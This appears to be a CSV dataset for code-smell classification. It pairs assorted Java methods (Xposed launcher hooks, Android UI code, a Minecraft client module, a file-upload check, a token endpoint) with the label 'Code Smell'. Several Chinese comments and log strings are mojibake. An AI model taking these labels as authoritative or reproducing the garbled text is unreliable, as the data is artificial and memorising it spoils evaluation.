text,label,text_label
"public static <A extends Annotation>A findAnnotation(Method method,Class<A> annotationType){
  A annotation=method.getAnnotation(annotationType);
  if (annotation != null) {
    return annotation;
  }
  return findAnnotation(method.getDeclaringClass(),method,annotationType);
}
private static <A extends Annotation>A findAnnotation(Class<?> declaringClass,Method method,Class<A> annotationType){
  if (declaringClass == null || declaringClass.equals(Object.class)) {
    return null;
  }
  if (declaringClass.getSuperclass() != null) {
    for (    Method methodCandidate : declaringClass.getSuperclass().getMethods()) {
      if (isOverride(method,methodCandidate)) {
        A annotation=findAnnotation(methodCandidate,annotationType);
        if (annotation != null) {
          return annotation;
        }
      }
    }
  }
  for (  Class<?> interfaceClass : declaringClass.getInterfaces()) {
    for (    Method methodCandidate : interfaceClass.getDeclaredMethods()) {
      if (isOverride(method,methodCandidate)) {
        A annotation=findAnnotation(methodCandidate,annotationType);
        if (annotation != null) {
          return annotation;
        }
      }
    }
    A annotation=findAnnotation(interfaceClass,method,annotationType);
    if (annotation != null) {
      return annotation;
    }
  }
  return findAnnotation(declaringClass.getSuperclass(),method,annotationType);
}
",1,Code Smell
"@Override public void init() throws NoSuchMethodException {
  if (isPad()) {
    findAndHookConstructor(""com.miui.home.recents.GestureStubView"",Context.class,new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        Context context=(Context)param.args[0];
        if (!isListen) {
          ContentObserver contentObserver=new ContentObserver(new Handler(context.getMainLooper())){
            @Override public void onChange(            boolean selfChange){
              isLock=getLockApp(context) != -1;
              if (isLock) {
                setGestureLine(context,1);
              }
 else {
                setGestureLine(context,0);
              }
            }
          }
;
          context.getContentResolver().registerContentObserver(Settings.Global.getUriFor(""key_lock_app""),false,contentObserver);
          isListen=true;
        }
      }
    }
);
    findAndHookMethod(""com.miui.home.recents.GestureInputHelper"",""onInputEvent"",InputEvent.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        if (isLock)         param.setResult(null);
      }
    }
);
    findAndHookConstructor(""com.miui.home.launcher.dock.DockControllerImpl"",""com.miui.home.launcher.hotseats.HotSeats"",""com.miui.home.launcher.Launcher"",new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        Context context=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        if (!isListen2) {
          ContentObserver contentObserver=new ContentObserver(new Handler(context.getMainLooper())){
            @Override public void onChange(            boolean selfChange){
              Object getMDockStateMachine=XposedHelpers.callMethod(param.thisObject,""getMDockStateMachine"");
              Object getMDockWindowManager=XposedHelpers.callMethod(param.thisObject,""getMDockWindowManager"");
              View mDockRootView=(View)XposedHelpers.getObjectField(getMDockWindowManager,""mDockRootView"");
              if (context == null) {
                logE(TAG,""DockControllerImpl context must not null"");
                return;
              }
              if (getLockApp(context) != -1) {
                XposedHelpers.callMethod(getMDockStateMachine,""notifyPinnedStateChanged"",false);
                mDockRootView.setVisibility(View.GONE);
              }
 else {
                XposedHelpers.callMethod(getMDockStateMachine,""notifyPinnedStateChanged"",true);
                mDockRootView.setVisibility(View.VISIBLE);
              }
            }
          }
;
          context.getContentResolver().registerContentObserver(Settings.Global.getUriFor(""key_lock_app""),false,contentObserver);
          isListen2=true;
        }
      }
    }
);
  }
 else {
    findAndHookConstructor(""com.miui.home.recents.NavStubView"",Context.class,new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        Context context=(Context)param.args[0];
        if (!isListen) {
          ContentObserver contentObserver=new ContentObserver(new Handler(context.getMainLooper())){
            @Override public void onChange(            boolean selfChange){
              isLock=getLockApp(context) != -1;
            }
          }
;
          context.getContentResolver().registerContentObserver(Settings.Global.getUriFor(""key_lock_app""),false,contentObserver);
          isListen=true;
        }
      }
    }
);
    findAndHookMethod(""com.miui.home.recents.NavStubView"",""onTouchEvent"",MotionEvent.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        if (isLock)         param.setResult(false);
      }
    }
);
  }
}",1,Code Smell
"@WorkerThread @NoOps @Status public static int init(@NonNull Context context,boolean force){
  String mode=getMode();
  sDirectRoot=hasRoot();
  if (MODE_AUTO.equals(mode)) {
    autoDetectRootSystemOrAdbAndPersist(context);
    return sIsAdb ? STATUS_SUCCESS : initPermissionsWithSuccess();
  }
  if (!force && isAMServiceUpAndRunning(context,mode)) {
    return sIsAdb ? STATUS_SUCCESS : initPermissionsWithSuccess();
  }
  if (MODE_NO_ROOT.equals(mode)) {
    sDirectRoot=false;
    sIsAdb=sIsSystem=sIsRoot=false;
    ExUtils.exceptionAsIgnored(() -> {
      if (LocalServer.alive(context)) {
        LocalServer.getInstance().closeBgServer();
      }
    }
);
    LocalServices.stopServices();
    return STATUS_SUCCESS;
  }
  try {
switch (mode) {
case MODE_ROOT:
      if (!sDirectRoot) {
        throw new Exception(""Root is unavailable."");
      }
    ExUtils.exceptionAsIgnored(() -> {
      if (LocalServer.alive(context)) {
        LocalServer.getInstance().closeBgServer();
      }
    }
);
  sIsSystem=sIsAdb=false;
sIsRoot=true;
LocalServices.bindServicesIfNotAlready();
return initPermissionsWithSuccess();
case MODE_ADB_WIFI:
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
if (!Utils.isWifiActive(context.getApplicationContext())) {
throw new Exception(""Wifi not enabled."");
}
if (AdbUtils.enableWirelessDebugging(context)) {
return STATUS_AUTO_CONNECT_WIRELESS_DEBUGGING;
}
 else {
return STATUS_WIRELESS_DEBUGGING_CHOOSER_REQUIRED;
}
}
case MODE_ADB_OVER_TCP:
sIsRoot=sIsSystem=false;
sIsAdb=true;
ServerConfig.setAdbPort(findAdbPort(context,10,AdbUtils.getAdbPortOrDefault()));
LocalServer.restart();
LocalServices.bindServicesIfNotAlready();
return checkRootOrIncompleteUsbDebuggingInAdb();
}
}
 catch (Throwable e) {
Log.e(TAG,e);
sIsAdb=sIsSystem=sIsRoot=false;
ThreadUtils.postOnMainThread(() -> UIUtils.displayLongToast(R.string.failed_to_use_the_current_mode_of_operation));
}
return STATUS_FAILURE;
}",1,Code Smell
"private void calculatePath(PlayerEntity player,double tickDelta){
  for (  Path path : paths)   path.clear();
  ItemStack itemStack=player.getMainHandStack();
  if (!items.get().contains(itemStack.getItem())) {
    itemStack=player.getOffHandStack();
    if (!items.get().contains(itemStack.getItem()))     return;
  }
  if (!simulator.set(player,itemStack,0,accurate.get(),tickDelta))   return;
  getEmptyPath().calculate();
  if (itemStack.getItem() instanceof CrossbowItem && EnchantmentHelper.getLevel(Enchantments.MULTISHOT,itemStack) > 0) {
    if (!simulator.set(player,itemStack,MULTISHOT_OFFSET,accurate.get(),tickDelta))     return;
    getEmptyPath().calculate();
    if (!simulator.set(player,itemStack,-MULTISHOT_OFFSET,accurate.get(),tickDelta))     return;
    getEmptyPath().calculate();
  }
}",1,Code Smell
"@Override public void connectionsUpdated(int[] positions){
  if (mFilteredConn == null) {
    for (    int pos : positions)     notifyItemChanged(pos);
    return;
  }
  ConnectionsRegister reg=CaptureService.requireConnsRegister();
  int first_removed_pos=-1;
  int num_just_removed=0;
  Arrays.sort(positions);
  for (  int reg_pos : positions) {
    ConnectionDescriptor conn=reg.getConn(reg_pos);
    if (conn != null) {
      int pos=getFilteredItemPos(conn.incr_id);
      if (pos != -1) {
        pos-=num_just_removed;
        if (matches(conn)) {
          Log.d(TAG,""Changed item "" + pos + "", dataset size: ""+ getItemCount());
          notifyItemChanged(pos);
        }
 else {
          Log.d(TAG,""Unmatch item "" + pos + "": ""+ conn.toString());
          removeFilteredItemAt(pos);
          num_just_removed++;
          if (first_removed_pos == -1)           first_removed_pos=pos;
        }
      }
    }
  }
  if (first_removed_pos != -1)   fixFilteredPositions(first_removed_pos);
}",1,Code Smell
"void writeIndexes(int[] indexes){
  boolean useIndexMap=this.indexMap != null;
  boolean useFixedIndexOffset=this.fixedIndexOffset != NO_FIXED_OFFSET;
  int valueCount;
  if (isCompressed(indexes)) {
    if (useFixedIndexOffset) {
      valueCount=decompressWithOffset(indexes,this.fixedIndexOffset,this.indexConsumer);
    }
 else {
      valueCount=decompress(indexes,useIndexMap ? this.indexMapConsumer : this.indexConsumer);
    }
  }
 else {
    if (useIndexMap) {
      for (int i=0; i < indexes.length; i++) {
        TranslucentData.writeQuadVertexIndexes(this.indexBuffer,this.indexMap[indexes[i]]);
      }
    }
 else     if (useFixedIndexOffset) {
      for (int i=0; i < indexes.length; i++) {
        TranslucentData.writeQuadVertexIndexes(this.indexBuffer,this.fixedIndexOffset + indexes[i]);
      }
    }
 else {
      TranslucentData.writeQuadVertexIndexes(this.indexBuffer,indexes);
    }
    valueCount=indexes.length;
  }
  if (useIndexMap || useFixedIndexOffset) {
    checkModificationCounter(valueCount);
  }
}",1,Code Smell
"@EventHandler(priority=EventPriority.LOW) private void onTick(TickEvent.Pre event){
  if (Modules.get().get(AutoGap.class).isEating())   return;
  if (eating) {
    if (shouldEat()) {
      if (mc.player.getInventory().getStack(slot).get(DataComponentTypes.FOOD) != null) {
        int slot=findSlot();
        if (slot == -1) {
          stopEating();
          return;
        }
 else {
          changeSlot(slot);
        }
      }
      eat();
    }
 else {
      stopEating();
    }
  }
 else {
    if (shouldEat()) {
      slot=findSlot();
      if (slot != -1)       startEating();
    }
  }
}",1,Code Smell
"public File verifyAndSaveFile(@NotNull MultipartFile originFile,String parentDir,boolean isBase64,String newFileName,String... fileTypes) throws HydraLabRuntimeException, IOException {
  File parentDirFile=new File(parentDir);
  if (!parentDirFile.exists() && !parentDirFile.mkdirs()) {
    throw new HydraLabRuntimeException(HttpStatus.INTERNAL_SERVER_ERROR.value(),""mkdirs failed!"");
  }
  String filename=FileUtil.getLegalFileName(originFile.getOriginalFilename());
  String fileSuffix=null;
  boolean isMatch=false;
  if (filename == null) {
    throw new HydraLabRuntimeException(HttpStatus.BAD_REQUEST.value(),""error file type: "" + filename);
  }
  if (fileTypes != null) {
    for (    String fileType : fileTypes) {
      if (filename.endsWith(fileType)) {
        fileSuffix=fileType;
        isMatch=true;
        break;
      }
    }
    if (!isMatch) {
      throw new HydraLabRuntimeException(HttpStatus.BAD_REQUEST.value(),""error file type: "" + filename);
    }
  }
  if (StringUtils.isEmpty(newFileName)) {
    newFileName=filename.replace(fileSuffix,"""") + ""_"" + System.currentTimeMillis() % 10000 + ""_"" + fileSuffix;
  }
  newFileName=FileUtil.getLegalFileName(newFileName);
  File file=new File(parentDir,newFileName);
  InputStream inputStream=originFile.getInputStream();
  if (isBase64) {
    inputStream=new Base64InputStream(originFile.getInputStream());
  }
  try (FileOutputStream fileOutputStream=new FileOutputStream(file)){
    IOUtils.copy(inputStream,fileOutputStream);
    return file;
  }
 }",1,Code Smell
"public static HashMap<String,Integer> getThemeFileValues(File file,String assetName,String[] wallpaperLink){
  FileInputStream stream=null;
  HashMap<String,Integer> stringMap=new HashMap<>(500);
  try {
    byte[] bytes=new byte[1024];
    int currentPosition=0;
    if (assetName != null) {
      file=getAssetFile(assetName);
    }
    stream=new FileInputStream(file);
    int idx;
    int read;
    boolean finished=false;
    int wallpaperFileOffset=-1;
    while ((read=stream.read(bytes)) != -1) {
      int previousPosition=currentPosition;
      int start=0;
      for (int a=0; a < read; a++) {
        if (bytes[a] == '\n') {
          int len=a - start + 1;
          String line=new String(bytes,start,len - 1);
          if (line.startsWith(""WLS="")) {
            if (wallpaperLink != null && wallpaperLink.length > 0) {
              wallpaperLink[0]=line.substring(4);
            }
          }
 else           if (line.startsWith(""WPS"")) {
            wallpaperFileOffset=currentPosition + len;
            finished=true;
            break;
          }
 else {
            if ((idx=line.indexOf('=')) != -1) {
              String key=line.substring(0,idx);
              String param=line.substring(idx + 1);
              int value;
              if (param.length() > 0 && param.charAt(0) == '#') {
                try {
                  value=Color.parseColor(param);
                }
 catch (                Exception ignore) {
                  value=Utilities.parseInt(param);
                }
              }
 else {
                value=Utilities.parseInt(param);
              }
              stringMap.put(key,value);
            }
          }
          start+=len;
          currentPosition+=len;
        }
      }
      if (previousPosition == currentPosition) {
        break;
      }
      stream.getChannel().position(currentPosition);
      if (finished) {
        break;
      }
    }
    stringMap.put(""wallpaperFileOffset"",wallpaperFileOffset);
  }
 catch (  Throwable e) {
    FileLog.e(e);
  }
 finally {
    try {
      if (stream != null) {
        stream.close();
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
  return stringMap;
}",1,Code Smell
"public void sendGetForImg(MediaServer mediaServerItem,String api,Map<String,Object> params,String targetPath,String fileName){
  String url=String.format(""http://%s:%s/index/api/%s"",mediaServerItem.getIp(),mediaServerItem.getHttpPort(),api);
  HttpUrl parseUrl=HttpUrl.parse(url);
  if (parseUrl == null) {
    return;
  }
  HttpUrl.Builder httpBuilder=parseUrl.newBuilder();
  httpBuilder.addQueryParameter(""secret"",mediaServerItem.getSecret());
  if (params != null) {
    for (    Map.Entry<String,Object> param : params.entrySet()) {
      httpBuilder.addQueryParameter(param.getKey(),param.getValue().toString());
    }
  }
  Request request=new Request.Builder().url(httpBuilder.build()).build();
  logger.info(request.toString());
  try {
    OkHttpClient client=getClient();
    Response response=client.newCall(request).execute();
    if (response.isSuccessful()) {
      if (targetPath != null) {
        File snapFolder=new File(targetPath);
        if (!snapFolder.exists()) {
          if (!snapFolder.mkdirs()) {
            logger.warn(""{}璺緞鍒涘缓澶辫触"",snapFolder.getAbsolutePath());
          }
        }
        File snapFile=new File(targetPath + File.separator + fileName);
        FileOutputStream outStream=new FileOutputStream(snapFile);
        outStream.write(Objects.requireNonNull(response.body()).bytes());
        outStream.flush();
        outStream.close();
      }
 else {
        logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s %s"",url,response.code(),response.message()));
      }
    }
 else {
      logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s %s"",url,response.code(),response.message()));
    }
    Objects.requireNonNull(response.body()).close();
  }
 catch (  ConnectException e) {
    logger.error(String.format(""杩炴帴ZLM澶辫触: %s, %s"",e.getCause().getMessage(),e.getMessage()));
    logger.info(""璇锋鏌edia閰嶇疆骞剁‘璁LM宸插惎鍔..."");
  }
catch (  IOException e) {
    logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s"",url,e.getMessage()));
  }
}
",1,Code Smell
"public void showTopView(boolean animated,final boolean openKeyboard){
  showTopView(animated,openKeyboard,false);
}
private void showTopView(boolean animated,final boolean openKeyboard,boolean skipAwait){
  if (topView == null || topViewShowed || getVisibility() != VISIBLE) {
    if ((recordedAudioPanel == null || recordedAudioPanel.getVisibility() != VISIBLE) && (!forceShowSendButton || openKeyboard)) {
      openKeyboard();
    }
    return;
  }
  boolean openKeyboardInternal=(recordedAudioPanel == null || recordedAudioPanel.getVisibility() != VISIBLE) && (!forceShowSendButton || openKeyboard) && (botReplyMarkup == null || editingMessageObject != null);
  if (!skipAwait && animated && openKeyboardInternal&& !(keyboardVisible || isPopupShowing())) {
    openKeyboard();
    if (showTopViewRunnable != null) {
      AndroidUtilities.cancelRunOnUIThread(showTopViewRunnable);
    }
    AndroidUtilities.runOnUIThread(showTopViewRunnable=() -> {
      showTopView(true,false,true);
      showTopViewRunnable=null;
    }
,200);
    return;
  }
  needShowTopView=true;
  topViewShowed=true;
  if (allowShowTopView) {
    topView.setVisibility(VISIBLE);
    topLineView.setVisibility(VISIBLE);
    if (currentTopViewAnimation != null) {
      currentTopViewAnimation.cancel();
      currentTopViewAnimation=null;
    }
    resizeForTopView(true);
    if (animated) {
      currentTopViewAnimation=ValueAnimator.ofFloat(topViewEnterProgress,1f);
      currentTopViewAnimation.addUpdateListener(topViewUpdateListener);
      currentTopViewAnimation.addListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          if (currentTopViewAnimation != null && currentTopViewAnimation.equals(animation)) {
            currentTopViewAnimation=null;
          }
          NotificationCenter.getInstance(currentAccount).onAnimationFinish(notificationsIndex);
          if (parentFragment != null && parentFragment.mentionContainer != null) {
            parentFragment.mentionContainer.setTranslationY(0);
          }
        }
      }
);
      currentTopViewAnimation.setDuration(ChatListItemAnimator.DEFAULT_DURATION + 20);
      currentTopViewAnimation.setInterpolator(ChatListItemAnimator.DEFAULT_INTERPOLATOR);
      currentTopViewAnimation.start();
      notificationsIndex=NotificationCenter.getInstance(currentAccount).setAnimationInProgress(notificationsIndex,null);
    }
 else {
      topViewEnterProgress=1f;
      topView.setTranslationY(0);
      topLineView.setAlpha(1.0f);
    }
    if (openKeyboardInternal) {
      if (messageEditText != null) {
        messageEditText.requestFocus();
      }
      openKeyboard();
    }
  }
}",1,Code Smell
"/** 
 * 鑾峰彇鎸囧畾share_token 杩斿洖share_token鎴朜ot_Login
 */
@GetMapping(""/token/shared_token"") public Result getSimplySharedToken(@RequestParam(""password"") String password,@RequestParam(""tokenName"") String tokenName){
  systemSetting systemSetting=systemService.selectSetting();
  if (!systemSetting.getIsGetToken()) {
    return Result.error(""Not_Open"");
  }
  if (password.equals(systemSetting.getGetTokenPassword())) {
    for (    token token : apiService.selectToken("""")) {
      if (token.getName().equals(tokenName)) {
        if (token.getShare_token() != null) {
          return Result.success(token.getShare_token());
        }
        return Result.error(""璇okenName娌℃湁瀛樻斁Shared_Token"");
      }
    }
    return Result.error(""鏈壘鍒拌tokenName锛�"");
  }
 else {
    return Result.error(""Not_Login"");
  }
}
",1,Code Smell
"public void set(final BaseFragment fragment,int currentAccount){
  final ArrayList<UnconfirmedAuthController.UnconfirmedAuth> auths=MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().auths;
  titleTextView.setText(LocaleController.getString(R.string.UnconfirmedAuthTitle));
  yesButton.setText(LocaleController.getString(R.string.UnconfirmedAuthConfirm));
  yesButton.setLoading(false,false);
  noButton.setText(LocaleController.getString(R.string.UnconfirmedAuthDeny));
  noButton.setLoading(false,false);
  if (auths != null && auths.size() == 1) {
    String from="""";
    from+=auths.get(0).device;
    if (!TextUtils.isEmpty(auths.get(0).location) && !from.isEmpty()) {
      from+="", "";
    }
    from+=auths.get(0).location;
    messageTextView.setText(LocaleController.formatString(R.string.UnconfirmedAuthSingle,from));
  }
 else   if (auths != null && auths.size() > 1) {
    String from=auths.get(0).location;
    for (int i=1; i < auths.size(); ++i) {
      if (!TextUtils.equals(from,auths.get(i).location)) {
        from=null;
        break;
      }
    }
    if (from == null) {
      messageTextView.setText(LocaleController.formatPluralString(""UnconfirmedAuthMultiple"",auths.size()));
    }
 else {
      messageTextView.setText(LocaleController.formatPluralString(""UnconfirmedAuthMultipleFrom"",auths.size(),from));
    }
  }
  yesButton.setOnClickListener(v -> {
    SpannableStringBuilder message=AndroidUtilities.replaceSingleTag(LocaleController.getString(R.string.UnconfirmedAuthConfirmedMessage),Theme.key_undo_cancelColor,REPLACING_TAG_TYPE_LINK,() -> {
      Bulletin.hideVisible();
      fragment.presentFragment(new SessionsActivity(0));
    }
);
    SpannableString arrowStr=new SpannableString("">"");
    ColoredImageSpan span=new ColoredImageSpan(R.drawable.attach_arrow_right);
    span.setOverrideColor(Theme.getColor(Theme.key_undo_cancelColor));
    span.setScale(.7f,.7f);
    span.setWidth(dp(12));
    arrowStr.setSpan(span,0,arrowStr.length(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    AndroidUtilities.replaceCharSequence("">"",message,arrowStr);
    BulletinFactory.of(fragment).createSimpleBulletin(R.raw.contact_check,LocaleController.getString(R.string.UnconfirmedAuthConfirmed),message).show();
    MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().confirm(auths,success -> {
    }
);
    MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().cleanup();
  }
);
  noButton.setOnClickListener(v -> {
    noButton.setLoading(true);
    MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().deny(auths,success -> {
      if (LaunchActivity.isActive)       showLoginPreventedSheet(success);
      noButton.setLoading(false);
      MessagesController.getInstance(currentAccount).getUnconfirmedAuthController().cleanup();
    }
);
  }
);
}",1,Code Smell
"protected void searchXml(final Element node,String keyword){
  String[] fs=keyword.split(""\\."");
  String current_keyword=fs[0];
  String attr_name=null;
  String new_keyword=null;
  if (current_keyword.contains(""#"")) {
    attr_name=current_keyword.split(""#"")[1];
    current_keyword=current_keyword.split(""#"")[0];
  }
  if (fs.length != 1) {
    new_keyword=keyword.replace(current_keyword + ""."","""");
  }
 else {
    new_keyword=current_keyword;
  }
  if (node.getName().equals(current_keyword)) {
    if (attr_name != null) {
      final List<Attribute> listAttr=node.attributes();
      for (      final Attribute attr : listAttr) {
        if (attr.getName().equals(attr_name)) {
          result.add(attr.getValue());
        }
      }
      return;
    }
    if (fs.length == 1) {
      result.add(node.getTextTrim());
    }
 else {
      final List<Element> listElement=node.elements();
      for (      final Element e : listElement) {
        searchXml(e,new_keyword);
      }
    }
  }
 else {
    final List<Element> listElement=node.elements();
    for (    final Element e : listElement) {
      searchXml(e,keyword);
    }
  }
}",1,Code Smell
"/** 
 * 閫掑綊鏋勯�犳楠ゆ爲
 * @param steps           褰撳墠鍦烘櫙涓嬶紝褰撳墠灞傜骇鐨勬楠�
 * @param parentStepMap   褰撳墠鍦烘櫙鎵�鏈夌殑姝ラ锛宬ey 涓虹埗姝ラID锛寁alue 涓哄瓙姝ラ鍒楄〃
 * @param scenarioStepMap 鎵�鏈夊満鏅楠わ紝key 涓哄満鏅疘D锛寁alue 涓哄瓙姝ラ鍒楄〃
 */
private List<ApiScenarioStepDTO> buildStepTree(List<ApiScenarioStepDTO> steps,Map<String,List<ApiScenarioStepDTO>> parentStepMap,Map<String,List<ApiScenarioStepDTO>> scenarioStepMap,Set<String> stepIdSet){
  if (CollectionUtils.isEmpty(steps)) {
    return Collections.emptyList();
  }
  for (int i=0; i < steps.size(); i++) {
    ApiScenarioStepDTO step=steps.get(i);
    if (stepIdSet.contains(step.getId())) {
      step=BeanUtils.copyBean(new ApiScenarioStepDTO(),step);
      steps.set(i,step);
    }
    stepIdSet.add(step.getId());
    List<ApiScenarioStepDTO> children=Optional.ofNullable(parentStepMap.get(step.getId())).orElse(new ArrayList<>(0));
    if (isRefOrPartialScenario(step)) {
      List<ApiScenarioStepDTO> scenarioSteps=scenarioStepMap.get(step.getResourceId());
      if (CollectionUtils.isEmpty(scenarioSteps)) {
        continue;
      }
      scenarioSteps.forEach(item -> {
        if (StringUtils.isEmpty(item.getParentId())) {
          children.add(item);
        }
      }
);
      if (CollectionUtils.isEmpty(children)) {
        continue;
      }
      Map<String,List<ApiScenarioStepDTO>> childStepMap=scenarioSteps.stream().collect(Collectors.groupingBy(item -> Optional.ofNullable(item.getParentId()).orElse(StringUtils.EMPTY)));
      step.setChildren(buildStepTree(children,childStepMap,scenarioStepMap,stepIdSet));
    }
 else {
      if (CollectionUtils.isEmpty(children)) {
        continue;
      }
      step.setChildren(buildStepTree(children,parentStepMap,scenarioStepMap,stepIdSet));
    }
  }
  return steps.stream().sorted(Comparator.comparing(ApiScenarioStepDTO::getSort)).collect(Collectors.toList());
}",1,Code Smell
